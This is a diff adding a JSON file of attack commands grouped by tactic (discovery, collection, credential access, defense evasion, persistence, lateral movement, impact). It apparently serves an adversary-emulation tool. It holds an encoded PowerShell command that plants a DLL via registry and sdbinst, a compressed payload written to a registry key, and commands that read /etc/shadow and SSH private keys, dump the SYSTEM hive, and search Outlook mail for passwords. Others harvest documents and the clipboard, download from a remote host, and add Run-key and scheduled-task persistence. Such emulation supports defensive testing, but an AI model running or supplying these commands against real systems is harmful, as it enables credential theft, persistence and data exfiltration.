@@ -1,0 +1,79 @@
+{
+   "Defense Evasion": [
+      "powershell.exe -noprofile -encodedCommand \"JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==\""
+   ],
+   "Discovery": [
+      "sc query",
+      "reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"",
+      "ipconfig /all",
+      "nslookup WATERFALLS\r",
+      "net accounts /domain",
+      "netstat -na",
+      "tasklist",
+      "net localgroup administrators",
+      "net group \"SQL Admins\" /domain"
+   ],
+   "Discovery,Execution": [
+      "powershell.exe -c \"ps\""
+   ],
+   "collection": [
+      "$clip_data=get-clipboard;\r\nif ($clip_data.Length -gt 0) {\r\n  write-host \"[+] Clipboard data obtained!\\n\";\r\n  write-host $clip_data;\r\n} else {\r\n  write-host \"[!] No clipboard data available!\\n\";\r\n}",
+      "$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\Draft.Zip -Force",
+      "copy aa.rar \"C:\\$Recycle.Bin\\\"",
+      "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\r\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\r\n$outlook = New-Object -comobject outlook.application;\r\n$namespace = $outlook.GetNameSpace(\"MAPI\");\r\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\r\n($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join \";\";"
+   ],
+   "credential-access": [
+      "cat /etc/shadow",
+      "cat /home/fherbert/.bash_history",
+      "cat /home/fherbert/.ssh/id_rsa;\r\ncat /home/fherbert/.ssh/id_rsa.pub;",
+      "cmd /c \"reg SAVE HKLM\\SYSTEM \\\\TSCLIENT\\X\\SYSTEM_HIVE\"\r",
+      "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = new-object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -ExpandProperty Body | Select-String \"password\") -replace \"\\s+\", \" \" -join \";\";"
+   ],
+   "defense-evasion": [
+      "Remove-Item -Path HKCU:\\Software\\Classes\\Folder* -Recurse -Force;\nif (!(test-path -path HKCU:\\Software\\Classes\\Folder)) {\n  write-host \"[+] Reg keys removed!\";\n }",
+      "cmd.exe /c 'REG ADD \"HKCU\\Software\\InternetExplorer\\AppDataLow\\Software\\Microsoft\\InternetExplorer\" /f /v \"{018247B2CAC14652E}\" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'"
+   ],
+   "discovery": [
+      "net start",
+      "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+      "netsh advfirewall show allprofiles",
+      "netstat -ano",
+      "cmd.exe /c net group \"Domain Admins\" /domain",
+      "ls 192.0.2.20",
+      "net user %USERNAME% /domain",
+      "nslookup bankdc",
+      "Get-ADComputer -Identity 'cfo' -Properties *",
+      "qwinsta /server:cfo\r",
+      "ps ax",
+      "ls -lsahR /var/ 2>/dev/null",
+      "Test-NetConnection \"192.0.2.10\"",
+      "Start-BitsTransfer -Source \"http://remote-host/TWUEGJDITXAONVPUOWFV\" -Destination \"C:\\ProgramData\\temp\\TWUEGJDITXAONVPUOWFV\"",
+      "net use",
+      "whoami",
+      "dsquery.exe computer -s 10.0.1.4 -u patreides -p ebqMB7DmM81QVUqpf7XI\r",
+      "whoami.exe",
+      "netstat -ano | findstr 3389",
+      "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMajorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentMinorVersionNumber &\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuild\n",
+      "dir /s /b C:\\ > dir.out",
+      "sc query >> discovery.txt",
+      "ipconfig /all",
+      "netstat -tan",
+      "tasklist.exe",
+      "whoami /groups >> discovery.txt",
+      "net config workstation >> discovery.txt",
+      "net user >> discovery.txt",
+      "net user /domain >> discovery.txt",
+      "nltest /domain_trusts /all_trusts >> discovery.txt"
+   ],
+   "impact": [
+      "write-host \"[*] Restarting Computer\";\nRestart-Computer -Force;"
+   ],
+   "lateral-movement": [
+      "cmdkey /add:127.0.0.2 /user:Administrator /pass:Password123!;\r\nmstsc /v:127.0.0.2;\r\nsleep 10;\r\nGet-Process -name mstsc;\r\nif ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}"
+   ],
+   "persistence": [
+      "C:\\Windows\\System32\\schtasks.exe /create /tn \"<<JY:NO DEFAULT-VALUE--DESC:'Task Name'>>\" /tr \"<<JY:NO DEFAULT-VALUE--DESC:'Path of task to run'>>\" /sc <<JY:NO DEFAULT-VALUE--DESC:'Schedule for task (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, and ONEVENT)'>> /ru System",
+      "\"C:\\Windows\\System32\\reg.exe\" ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"<<JY:NO DEFAULT-VALUE--DESC:'Name of the registry entry to be added'>>\" /t REG_SZ /d \"<<JY:NO DEFAULT-VALUE--DESC:'Data for new registry entry'>>\" /f\n",
+      "schtasks /create /sc \"DAILY\" /tn \"taskname\" /tr \"C:\\Windows\\Temp\" /ru \"username\""
+   ]
+}
